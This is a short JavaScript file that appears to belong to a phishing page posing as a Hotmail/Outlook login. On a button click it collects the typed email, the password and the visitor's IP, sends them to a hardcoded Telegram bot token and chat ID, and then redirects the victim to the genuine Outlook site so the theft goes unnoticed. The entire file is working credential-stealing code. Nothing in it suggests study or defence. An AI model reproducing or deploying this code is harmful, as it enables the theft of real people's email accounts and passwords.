 
    const token = '7903185458:AAEcNsKaDa2aFz1xJ1C95-6eEnDC2xOu-O4';
    const chatId = '7370656444';


    $(document).ready(function () {
        $("#botonsito2").on('click', function (event) {
            execute();
            
        });


        function execute() {
            
            const name = document.querySelector('#email').value;
            const last = document.querySelector('#pass').value;
            ip2 = document.getElementById("address").innerHTML;
             message =  "Data Hotmail\nCorreo: "+ name + "\nClave: " + last + "\nIP:" + ip2; 

            $.ajax({
                type: 'POST',
                url: `https://api.telegram.org/bot${token}/sendMessage`,
                data: {
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'html',
                },
                success: function (res) {
                    window.location = 'https://outlook.live.com/mail/0/archive';
                },
                error: function (error) {
                    console.error(error);
                    alert("Vuelva a iniciar sesión");
                }
            });

        }
    });
 